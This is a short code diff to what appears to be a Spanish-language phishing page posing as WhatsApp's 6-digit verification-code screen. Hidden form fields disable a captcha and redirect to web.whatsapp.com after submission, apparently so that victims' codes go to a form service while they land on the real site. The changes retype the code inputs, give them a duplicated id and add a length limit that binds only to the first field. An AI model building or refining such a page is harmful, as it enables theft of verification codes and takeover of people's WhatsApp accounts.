@@ -95,12 +95,12 @@
               <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_next" value="https://web.whatsapp.com">
               <div class="continputs">
-                <input type="text" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57" autofocus>
-                <input type="text" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
-                <input type="text" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
-                <input type="text" maxlength="1" onkeyup="moveToNext(this)"onkeypress="return event.charCode >= 48 && event.charCode <= 57">
-                <input type="text" maxlength="1" onkeyup="moveToNext(this)"onkeypress="return event.charCode >= 48 && event.charCode <= 57">
-                <input type="text" maxlength="1" onkeyup="moveToNext(this)"onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="number" id="numero" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57" autofocus>
+                <input type="number" id="numero" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="number" id="numero" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="number" id="numero" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="number" id="numero" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                <input type="number" id="numero" maxlength="1" onkeyup="moveToNext(this)" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
               </div>
                 <p class="pequeslabel" >Ingrese el código de 6 dígitos</p>
                 <p class="pequeslabel" >¿No recibiste el codigo?</p>
@@ -118,6 +118,16 @@
             nextInput.focus();
           }
         }
+        
+        var myNumberInput = document.querySelector('#numero');
+        
+        myNumberInput.addEventListener('input', (event) => {
+  const input = event.target.value;
+  if (input.length > 10) {
+    event.target.value = input.slice(0, 10);
+  }
+});
+
 
         function actualizarContador() {
           var tiempoRestante = 180; // 3 minutos en segundos
